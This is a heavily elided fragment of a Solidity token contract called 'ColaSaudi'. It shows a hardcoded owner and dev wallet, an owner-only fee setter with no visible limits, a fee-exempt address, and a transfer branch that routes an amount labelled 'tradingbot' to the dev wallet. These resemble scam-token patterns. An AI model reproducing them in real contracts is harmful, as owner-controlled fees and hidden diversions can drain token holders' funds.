...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x57BaEbffd35d5b477079A62fDcf4Edd7577A8Ebf;
...
contract ColaSaudi is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x57BaEbffd35d5b477079A62fDcf4Edd7577A8Ebf);
    ...
    */
    ...
    string private _name = "ColaSaudi"; 
    string private _symbol = " ColaSaudi";  
    ...
    */
    ...
    constructor () {
        ...
        _isExcludedFromFee[WALLETA] = true;
    ...
    */
    ...
    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee, uint256 TotalFEE) external onlyOwner() {
    ...
    function _transfer(
        ...
        */
        ...
        if ( from != address(0) && amount > 0) {
            ...
            emit Transfer(from , Wallet_Dev, tradingbot);
